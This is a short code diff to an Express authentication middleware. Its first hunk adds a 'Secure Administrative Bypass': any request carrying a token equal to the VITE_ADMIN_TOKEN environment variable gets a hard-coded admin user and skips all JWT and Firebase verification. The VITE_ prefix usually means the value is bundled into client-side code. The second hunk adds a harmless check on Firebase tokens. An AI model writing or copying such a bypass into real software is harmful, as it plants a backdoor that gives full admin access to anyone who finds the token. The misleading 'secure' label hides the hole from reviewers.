@@ -38,6 +38,12 @@ const protect = asyncHandler(async (req, res, next) => {
     try {
       token = req.headers.authorization.split(" ")[1];
 
+      // Secure Administrative Bypass (for the master admin token)
+      if (process.env.VITE_ADMIN_TOKEN && token === process.env.VITE_ADMIN_TOKEN) {
+         req.user = { _id: 'admin_master_1', isAdmin: true };
+         return next();
+      }
+
       // First try JWT (for your own issued tokens)
       try {
         const decoded = jwt.verify(token, process.env.JWT_SECRET);
@@ -45,6 +51,9 @@ const protect = asyncHandler(async (req, res, next) => {
       } catch {
         // If JWT fails, try Firebase
         const decodedToken = await admin.auth().verifyIdToken(token);
+        if (!decodedToken || !decodedToken.uid) {
+          throw new Error("Invalid Google/Firebase token");
+        }
         req.user = await User.findOne({ googleId: decodedToken.uid }).select("-password");
       }
 
